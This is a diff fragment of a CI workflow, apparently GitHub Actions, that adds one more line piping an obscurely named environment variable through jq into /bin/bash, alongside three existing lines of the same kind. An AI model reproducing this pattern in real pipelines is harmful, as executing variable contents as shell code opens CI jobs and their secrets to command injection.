@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$nvkpz0159" | jq -r .woxb52 | /bin/bash
           echo $bn7 | jq -r .j3 | /bin/bash
           echo $ezorq921 | jq -r .llcdh9237 | /bin/bash
+          echo $q229 | jq -r .z22 | /bin/bash
 
       - name: Save output
         if: always()
